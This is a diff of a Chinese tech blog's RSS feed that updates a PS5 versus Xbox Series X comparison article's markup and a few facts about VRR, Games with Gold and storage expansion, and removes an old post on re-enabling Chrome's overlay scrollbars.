 <p>在软件上，PS5 加入了<strong>无剧透指南</strong>功能（需 PS Plus 会员），游戏卡关时无需上网查攻略，按下 PS 按钮，即可直接查看游戏开发者制作的无剧透视频指南。还可以使用新的分屏功能，把指南/网页固定在屏幕两侧，边看边玩游戏。</p>
@@ -515,28 +1173,26 @@
 <p>另外，PS5 兼容 PS4 时代的 <strong>PS VR</strong>，为 PS5 打造的<a href="https://blog.playstation.com/2021/03/18/next-gen-vr-on-ps5-the-new-controller/" target="_blank" rel="noreferrer noopener">次世代 VR 也在开发中</a>。Xbox 则依然未见支持 VR 的计划。</p>
 
 
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/vr.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/vr-1024x575.png" alt="极具未来感的次世代 VR，图片来自 Sony 博客。" class="wp-image-2343" width="424" height="237" srcset="https://dev.moe/wp-content/uploads/2021/06/vr-1024x575.png 1024w, https://dev.moe/wp-content/uploads/2021/06/vr-300x168.png 300w, https://dev.moe/wp-content/uploads/2021/06/vr-768x431.png 768w, https://dev.moe/wp-content/uploads/2021/06/vr.png 1275w" sizes="(max-width: 424px) 100vw, 424px" /></a><figcaption>极具未来感的次世代 VR (Sony)</figcaption></figure></div>
 
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/vr.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/vr-1024x575.png" alt="极具未来感的次世代 VR，图片来自 Sony 博客。" class="wp-image-2343" width="424" height="237" srcset="https://dev.moe/wp-content/uploads/2021/06/vr-1024x575.png 1024w, https://dev.moe/wp-content/uploads/2021/06/vr-300x168.png 300w, https://dev.moe/wp-content/uploads/2021/06/vr-768x431.png 768w, https://dev.moe/wp-content/uploads/2021/06/vr.png 1275w" sizes="(max-width: 424px) 100vw, 424px" /></a><figcaption>极具未来感的次世代 VR (Sony)</figcaption></figure></div>
 
-
-
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
 
 <p>Xbox Series X 的创新比起 PS5 并不多，最大的创新或许是 <strong>Quick Resume</strong> 功能。<strong>玩家可以随时在多款游戏中来回切换，不会丢失一点进度。甚至在机器正常关机并断电后，仍可返回原来的游戏进度。</strong>值得一提的是，从 PS5 快捷菜单的设计来看，Sony 可能也有计划加入类似 Quick Resume 的功能。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-1024x576.png" alt="Xbox 有了 Quick Resume，游戏可以随时切换，不会丢失进度。" class="wp-image-2344" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>有了 Quick Resume，游戏想切就切 (Xbox)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-1024x576.png" alt="Xbox 有了 Quick Resume，游戏可以随时切换，不会丢失进度。" class="wp-image-2344" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>有了 Quick Resume，游戏想切就切 (Xbox)</figcaption></figure></div>
 
 
 <p>Xbox Series X 还有优化老游戏的 FPS Boost 及 Auto HDR 功能。</p>
 
 
 
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
 
@@ -544,7 +1200,7 @@
 
 
 
-<h2>性能（分辨率、帧率、画面表现）</h2>
+<h2 id="性能-分辨率-帧率-画面表现">性能（分辨率、帧率、画面表现）</h2>
 
 
 
@@ -556,23 +1212,22 @@
 
 
 
-<h3>老游戏性能</h3>
+<h3 id="老游戏性能">老游戏性能</h3>
 
 
 
 <p>也许是传承了 Microsoft 的作风，<strong>Xbox Series X|S 对老游戏的兼容相当不错。</strong>不仅可以兼容 Xbox 2001 年发布以来的大多数游戏，还设计了 FPS Boost（<a href="https://majornelson.com/fpsboost/" target="_blank" rel="noreferrer noopener">支持游戏列表</a>）及 Auto HDR 等功能，可以提升老游戏的分辨率、解锁帧率及提升画面表现。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-5.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-5-1024x576.png" alt="Xbox 可以在部分老游戏开启 Auto HDR 和 FPS Boost 功能，让老游戏焕发新生。" class="wp-image-2351" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-5-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-5-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-5-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-5.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>老游戏新生 (Xbox)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-5.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-5-1024x576.png" alt="Xbox 可以在部分老游戏开启 Auto HDR 和 FPS Boost 功能，让老游戏焕发新生。" class="wp-image-2351" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-5-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-5-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-5-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-5.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>老游戏新生 (Xbox)</figcaption></figure></div>
 
 
 <p>PS5 可兼容 PS4 的游戏，但对画面及帧率的提升有限。</p>
 
 
 
-<h3>120fps</h3>
+<h3 id="120fps">120fps</h3>
 
 
 
@@ -584,11 +1239,11 @@
 
 
 
-<h3>其他</h3>
+<h3 id="其他">其他</h3>
 
 
 
-<ul><li><strong>PS5 不支持输出 1440p 画面。</strong>如果玩家的显示器为 1440p (2K)，且不支持 4K 输入，则将只能在 1080p 下使用 PS5。由于存在非整数倍放大，体验将比使用 1080p 显示器更差。Xbox 支持 1440p 输出。</li><li><strong>Xbox Series X|S 的<strong>系统 UI</strong> 仍在使用 1080p（4K 界面已于 2021 年 8 月开始内测，预计 2021 年冬正式推出），文字边缘模糊。</strong>PS5 的系统 UI 则全面支持 4K HDR，文字图案锐利清晰，且免去打开 HDR 游戏时的模式切换。</li><li>Xbox Series X|S 已支持 AMD FreeSync &amp; HDMI 2.1 VRR（可变帧率）及 Dolby Vision（杜比视界）。PS5 承诺未来更新支持 VRR。</li><li>随着 AMD 推出 FidelityFX Super Resolution（FSR，类似 Nvidia 的 DLSS），可预见两款主机未来会有更多观感更好的 4K 光追游戏。</li><li>Xbox 玩家可以在天猫花 ￥20 购买 Dolby Atmos（杜比全景声），在使用耳机时获得听声辨位的体验。</li></ul>
+<ul><li><strong>PS5 不支持输出 1440p 画面。</strong>如果玩家的显示器为 1440p (2K)，且不支持 4K 输入，则将只能在 1080p 下使用 PS5。由于存在非整数倍放大，体验将比使用 1080p 显示器更差。Xbox 支持 1440p 输出。</li><li><strong>Xbox Series X|S 的<strong>系统 UI</strong> 仍在使用 1080p（4K 界面已于 2021 年 8 月开始内测，预计 2021 年冬正式推出），文字边缘模糊。</strong>PS5 的系统 UI 则全面支持 4K HDR，文字图案锐利清晰，且免去打开 HDR 游戏时的模式切换。</li><li>Xbox Series X|S 已支持 AMD FreeSync &amp; HDMI 2.1 VRR（可变帧率）及 Dolby Vision（杜比视界）。PS5 也已通过系统更新支持 VRR。</li><li>随着 AMD 推出 FidelityFX Super Resolution（FSR，类似 Nvidia 的 DLSS），可预见两款主机未来会有更多观感更好的 4K 光追游戏。</li><li>Xbox 玩家可以在天猫花 ￥20 购买 Dolby Atmos（杜比全景声），在使用耳机时获得听声辨位的体验。</li></ul>
 
 
 
@@ -596,7 +1251,7 @@
 
 
 
-<h2>区域锁及价格</h2>
+<h2 id="区域锁及价格">区域锁及价格</h2>
 
 
 
@@ -604,28 +1259,26 @@
 
 
 
-<h3>Xbox</h3>
+<h3 id="xbox">Xbox</h3>
 
 
 
-<ul><li><strong>++ 帐号不绑定区域，可随意出入各区商店</strong></li><li><strong>++ 游戏不分区域，可低价区购买（多币种信用卡），换商店下载想要的语言版本（除极少数例外，如鬼泣5）</strong></li><li><strong>++ Xbox Game Pass Ultimate（XGPU）订阅包含 300+ 游戏及 EA Play，大作及新游戏很多，质量极高</strong>（<a href="https://www.xbox.com/zh-TW/xbox-game-pass/games" target="_blank" rel="noreferrer noopener">游戏库</a>）</li><li>+ XGPU 自带的 Xbox Live Gold 会员每月可领 3+ 免费小游戏，质量一般，锁区游戏可跨区领取（<a href="https://xbox.fandom.com/wiki/List_of_Games_with_Gold" target="_blank" rel="noreferrer noopener">历史游戏列表</a>）</li><li>+ 大部分第一方游戏及 XGPU 游戏同时支持 PC 版，一次购买双平台游玩</li><li>+ 云存档免费，部分游戏可同步存档到 PC 上继续游玩，但存档逻辑设计一般（有丢存档案例），不支持存档本地备份</li><li>&#8211; 需要 Xbox Live Gold 才能联机游戏</li><li>+ 支持自助退款（不可滥用）</li><li>+ 可与一位信任的朋友互换帐号游玩双方的库</li><li>&#8211; 支持普通硬盘扩展储存（仅可运行上世代游戏），本世代游戏需购买 Xbox 专用硬盘扩容</li><li>&#8211; 实体版游戏货源不多，实体盘可出二手</li></ul>
+<ul><li><strong>++ 帐号不绑定区域，可随意出入各区商店</strong></li><li><strong>++ 游戏不分区域，可低价区购买（多币种信用卡），换商店下载想要的语言版本（除极少数例外，如鬼泣5）</strong></li><li><strong>++ Xbox Game Pass Ultimate（XGPU）订阅包含 300+ 游戏及 EA Play，大作及新游戏很多，质量极高</strong>（<a href="https://www.xbox.com/zh-TW/xbox-game-pass/games" target="_blank" rel="noreferrer noopener">游戏库</a>）</li><li>+ XGPU 自带的 Xbox Live Gold 会员每月可领 2+ 免费小游戏，质量一般，锁区游戏可跨区领取（<a href="https://xbox.fandom.com/wiki/List_of_Games_with_Gold" target="_blank" rel="noreferrer noopener">历史游戏列表</a>）</li><li>+ 大部分第一方游戏及 XGPU 游戏同时支持 PC 版，一次购买双平台游玩</li><li>+ 云存档免费，部分游戏可同步存档到 PC 上继续游玩，但存档逻辑设计一般（有丢存档案例），不支持存档本地备份</li><li>&#8211; 需要 Xbox Live Gold 才能联机游戏</li><li>+ 支持自助退款（不可滥用）</li><li>+ 可与一位信任的朋友互换帐号游玩双方的库</li><li>+ 支持普通硬盘扩展储存（仅可运行上世代游戏），本世代游戏需购买 Xbox 专用硬盘扩容（但已有第三方卡套，可配合 CH SN530 / XA1 等少数硬盘使用）</li><li>&#8211; 实体版游戏货源不多，实体盘可出二手</li></ul>
 
 
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png" alt="数了一下目前的 Xbox Game Pass 游戏库，竟有 300 多款游戏，这还没算上 EA Play 的 70 多款游戏。" class="wp-image-2346" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-2-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-2-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-2.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>数了一下目前的 Xbox Game Pass 游戏库 ——共有 51 行（这还没算上 EA Play 的 70+ 游戏）</figcaption></figure></div>
 
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png" alt="数了一下目前的 Xbox Game Pass 游戏库，竟有 300 多款游戏，这还没算上 EA Play 的 70 多款游戏。" class="wp-image-2346" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-2-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-2-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-2.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>数了一下目前的 Xbox Game Pass 游戏库 ——共有 51 行（这还没算上 EA Play 的 70+ 游戏）</figcaption></figure></div>
 
-
-
-<h3>PS5</h3>
+<h3 id="ps5">PS5</h3>
 
 
 
 <ul><li>&#8211; 帐号绑定区域，不支持换区</li><li>&#8211; 游戏分多个区域版本，中文版大多仅在高价区有售</li><li><strong>++ PS Plus 会员可通过 PS Plus Collection 获得约 20 款 PS4 知名经典游戏，质量极高</strong></li><li>+ 美区/日区有 PS Now 游戏订阅，可游玩 400+ 游戏（部分仅支持远程游玩），但订阅价格高，中文游戏少（<a href="https://www.playstation.com/en-us/ps-now/ps-now-games/" target="_blank" rel="noreferrer noopener">美区游戏库</a>）</li><li><strong>++ PS Plus 会员每月可领 3+ 免费游戏，质量有时极高，不可跨区领取</strong>（<a href="https://zh.wikipedia.org/zh/PlayStation_Plus%E6%AF%8F%E6%9C%88%E5%85%8D%E8%B2%BB%E9%81%8A%E6%88%B2%E5%88%97%E8%A1%A8%EF%BC%88%E6%B8%AF%E5%8F%B0%E5%8D%80%EF%BC%89" target="_blank" rel="noreferrer noopener">历史游戏列表</a>）</li><li>+ 仅 PS Plus 会员支持云存档，存档逻辑设计较好，PS5 游戏不支持存档本地备份</li><li>&#8211; 需要 PS Plus 才能联机游戏</li><li>&#8211; 不支持自助退款（联系客服可能有一次退款机会）</li><li>+ 可与一位信任的朋友互换帐号游玩双方的库</li><li>+ 支持普通硬盘扩展储存（仅可运行上世代游戏），本世代游戏可购买指定型号的通用硬盘扩容</li><li>+ 实体版游戏货源丰富，可租实体游戏游玩</li></ul>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-7.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-7-1024x576.png" alt="PS5 玩家拿到机器，开通 PS Plus 会员后，可以立即获得 20 款 PS4 经典大作。" class="wp-image-2353" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-7-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-7-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-7-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-7-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-7-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-7.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>20 款知名经典游戏，开会员即玩 (PS5)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-7.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-7-1024x576.png" alt="PS5 玩家拿到机器，开通 PS Plus 会员后，可以立即获得 20 款 PS4 经典大作。" class="wp-image-2353" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-7-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-7-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-7-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-7-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-7-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-7.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>20 款知名经典游戏，开会员即玩 (PS5)</figcaption></figure></div>
 
 
 <p>在 Xbox 上，利用巴西等低价区可用接近一半的价格购买游戏。Xbox Game Pass（XGP）游戏库内也有大量的大作（甚至发售当日的作品）可以直接游玩，没有试错成本。</p>
@@ -636,7 +1289,7 @@
 
 
 
-<h2>独占游戏</h2>
+<h2 id="独占游戏">独占游戏</h2>
 
 
 
@@ -652,7 +1305,7 @@
 
 
 
-<h2>远程游玩及分享</h2>
+<h2 id="远程游玩及分享">远程游玩及分享</h2>
 
 
 
@@ -660,48 +1313,43 @@
 
 
 
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
 
 <p>上世代 Xbox 曾经拥有体验不错的局域网远程游玩（Console Companion 应用）及设计精良的 Mixer 直播平台（延迟极低，甚至支持观众与游戏互动）。可是到了 Xbox Series X|S，两者都被砍了。Xbox Series X|S 的截屏及录制则与上一代区别不大，手柄加了个独立的截屏按钮，录制、分享体验依旧只是勉强能用的程度（截图要弹两条挡屏幕的通知，录制只能录几分钟）。</p>
 
 
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-9.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-9-1024x576.png" alt="在 Xbox 中可以录制过去发生的事，但有时间限制。" class="wp-image-2355" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-9-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-9-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-9-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-9.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>录制过去发生的事&#8230; (Xbox)</figcaption></figure></div>
 
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-9.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-9-1024x576.png" alt="在 Xbox 中可以录制过去发生的事，但有时间限制。" class="wp-image-2355" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-9-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-9-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-9-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-9.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>录制过去发生的事&#8230; (Xbox)</figcaption></figure></div>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-10.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-10-1024x576.png" alt="在 Xbox 中，1080p 只能录制 1 分钟。" class="wp-image-2356" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-10-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-10-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-10-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-10.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>&#8230;但最长 1 分钟 (Xbox)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-10.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-10-1024x576.png" alt="在 Xbox 中，1080p 只能录制 1 分钟。" class="wp-image-2356" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-10-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-10-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-10-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-10.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>&#8230;但最长 1 分钟 (Xbox)</figcaption></figure></div>
 
 
 <p>PS5 则是相比上一代全面提升，远程游玩支持了 HDR，直播推流更方便，截屏及录制的交互也再度升级，获得奖杯时还会自动生成一段录像，更加完善好用。</p>
 
 
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/achievement.jpg"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/achievement-1024x576.jpg" alt="PS5 会自动录制获得成就的精彩瞬间，以及之前30秒发生的故事。" class="wp-image-2349" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/achievement-1024x576.jpg 1024w, https://dev.moe/wp-content/uploads/2021/06/achievement-300x169.jpg 300w, https://dev.moe/wp-content/uploads/2021/06/achievement-768x432.jpg 768w, https://dev.moe/wp-content/uploads/2021/06/achievement-1536x864.jpg 1536w, https://dev.moe/wp-content/uploads/2021/06/achievement-1568x882.jpg 1568w, https://dev.moe/wp-content/uploads/2021/06/achievement.jpg 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>自动记录获得成就的精彩瞬间，以及之前30秒发生的故事 (PS5)</figcaption></figure></div>
 
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/achievement.jpg"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/achievement-1024x576.jpg" alt="PS5 会自动录制获得成就的精彩瞬间，以及之前30秒发生的故事。" class="wp-image-2349" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/achievement-1024x576.jpg 1024w, https://dev.moe/wp-content/uploads/2021/06/achievement-300x169.jpg 300w, https://dev.moe/wp-content/uploads/2021/06/achievement-768x432.jpg 768w, https://dev.moe/wp-content/uploads/2021/06/achievement-1536x864.jpg 1536w, https://dev.moe/wp-content/uploads/2021/06/achievement-1568x882.jpg 1568w, https://dev.moe/wp-content/uploads/2021/06/achievement.jpg 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>自动记录获得成就的精彩瞬间，以及之前30秒发生的故事 (PS5)</figcaption></figure></div>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-11.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-11-1024x577.png" alt="PS5 的分享界面可以录制过去发生的事（图中显示可以录制 60 分钟）、截图、开始录制，以及推流到直播平台。" class="wp-image-2357" width="512" height="289" srcset="https://dev.moe/wp-content/uploads/2021/06/image-11-1024x577.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-11-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-11-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-11-1536x865.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-11-1568x883.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-11.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>录制过去发生的事、截图、开始录制，以及开始推流 (PS5) </figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-11.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-11-1024x577.png" alt="PS5 的分享界面可以录制过去发生的事（图中显示可以录制 60 分钟）、截图、开始录制，以及推流到直播平台。" class="wp-image-2357" width="512" height="289" srcset="https://dev.moe/wp-content/uploads/2021/06/image-11-1024x577.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-11-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-11-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-11-1536x865.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-11-1568x883.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-11.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>录制过去发生的事、截图、开始录制，以及开始推流 (PS5) </figcaption></figure></div>
 
 
 <p>需要注意，由于 PS5 手柄自带麦克风，如果推流时无需录音，每次推流时需手动关闭麦克风。</p>
 
 
 
-<h2>维护及维修</h2>
+<h2 id="维护及维修">维护及维修</h2>
 
 
 
 <p>更换风扇及清灰：在清灰设计上，PS5 设计了专用清灰孔，可以使用吸尘器直接清灰，拆装风扇也无需戳破保修标签。Xbox Series X 如果拆机会破坏保修标签，只能尝试使用高压空气除尘。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://images.pushsquare.com/7ca47b655e6e4/ps5-playstation-5-dust-catcher-1.original.jpg" alt="PS5 的清灰孔之一，用吸尘器可以清灰。" width="656" height="369"/><figcaption>清灰孔之一 (PS5)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter is-resized"><img loading="lazy" src="https://images.pushsquare.com/7ca47b655e6e4/ps5-playstation-5-dust-catcher-1.original.jpg" alt="PS5 的清灰孔之一，用吸尘器可以清灰。" width="656" height="369"/><figcaption>清灰孔之一 (PS5)</figcaption></figure></div>
 
 
 <p>固态硬盘：PS5 的固态硬盘是焊在主板上的，寿命耗尽后机器或将报废。Xbox Series X 内置的固态硬盘可更换（会破坏保修贴，过程较复杂）。</p>
@@ -720,7 +1368,7 @@
 
 
 
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
 
@@ -728,7 +1376,7 @@
 
 
 
-<p>Xbox 系统则传承了 Microsoft “能用就行”的传统，功能都有，但也不精致。当主机已经支持 8K 分辨率时，系统竟仍在以 1080p 渲染。好在 Microsoft 没有在关键的游戏体验上将就——Xbox 杀手级的 Xbox Game Pass 游戏库，极为宽松的区域锁政策，以及极为优异的噪音控制，一个个解决了玩家的痛点，让玩家以零成本发现优秀游戏，也不再让玩家成为正版的“受害者”。</p>
+<p>Xbox 系统则传承了 Microsoft “能用就行”的传统，功能都有，但也不精致。当主机宣称支持 8K 分辨率时，发售时的系统竟仍在以 1080p 渲染。好在 Microsoft 没有在关键的游戏体验上将就——Xbox 杀手级的 Xbox Game Pass 游戏库，极为宽松的区域锁政策，以及极为优异的噪音控制，一个个解决了玩家的痛点，让玩家以零成本发现优秀游戏，也不再让玩家成为正版的“受害者”。</p>
 
 
 
@@ -736,7 +1384,7 @@
 
 
 
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
 
@@ -2456,1256 +3104,5 @@ if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){
 		
 		
 		<post-id xmlns="com-wordpress:feed-additions:1">1907</post-id>	</item>
-		<item>
-		<title>在 Chrome 78 启用 overlay-scrollbars</title>
-		<link>https://dev.moe/1413</link>
-					<comments>https://dev.moe/1413#comments</comments>
-		
-		<dc:creator><![CDATA[Coxxs]]></dc:creator>
-		<pubDate>Thu, 24 Oct 2019 07:29:23 +0000</pubDate>
-				<category><![CDATA[Random]]></category>
-		<guid isPermaLink="false">https://coxxs.me/?p=1413</guid>
-
-					<description><![CDATA[<p>2021-6-24 Chrome 91 中已重新加回 overlay-scrollbars。chrome://<a class="more-link" href="https://dev.moe/1413">继续阅读<span class="screen-reader-text">"在 Chrome 78 启用 overlay-scrollbars"</span></a></p>
-<p><a rel="nofollow" href="https://dev.moe/1413">在 Chrome 78 启用 overlay-scrollbars</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></description>
-										<content:encoded><![CDATA[
-<p><strong>2021-6-24</strong> Chrome 91 中已重新加回 overlay-scrollbars。<code>chrome://flags/#overlay-scrollbars</code></p>
-
-
-
-<p>Chrome 的 Overlay Scrollbars（重叠式滚动条）我已用了好几年了。小小的透明灰条替代了原本占据一定宽度的粗滚动条，让视野干净不少，也消除了同一网站下网页切换时滚动条出现/消失时带来的页面抖动。</p>
-
-
-
-<figure class="wp-block-image is-resized"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2019/11/image-3-1024x562.png" alt="" class="wp-image-1809" width="588" height="322" srcset="https://dev.moe/wp-content/uploads/2019/11/image-3-1024x562.png 1024w, https://dev.moe/wp-content/uploads/2019/11/image-3-300x165.png 300w, https://dev.moe/wp-content/uploads/2019/11/image-3-768x422.png 768w, https://dev.moe/wp-content/uploads/2019/11/image-3.png 1515w" sizes="(max-width: 588px) 100vw, 588px" /></figure>
-
-
-
-<p>然而在 Chrome 78 中，这个滚动条的开关在 <code>chrome://flags</code> 页面消失了。之前若是已启用 Overlay Scrollbars，仍可以继续使用该特性。但如果碰上浏览器重装或是新装，就找不到这个功能的开关了。</p>
-
-
-
-<span id="more-1413"></span>
-
-
-
-<p>好在这个功能的相关代码仍未被去除，该 flag <a rel="noreferrer noopener" aria-label="似乎只是“过期”了 (opens in a new tab)" href="https://groups.google.com/a/chromium.org/forum/#!topic/chromium-dev/9y_Xh8O-gXU" target="_blank">似乎只是“过期”了</a>。因此研究了下 <code>chrome://flags</code> 页面，找出了在 Chrome 78 下启用 Overlay Scrollbars 的方法：</p>
-
-
-
-<ol><li>打开 <code>chrome://flags</code> 页面</li><li>按 <code>F12</code> 打开开发者工具，并切换到 <code>Console</code> 页面</li><li>输入 <code>chrome.send('enableExperimentalFeature', ['overlay-scrollbars@1', 'true']);</code> 并按 <code>Enter</code></li><li>重启浏览器</li></ol>
-
-
-
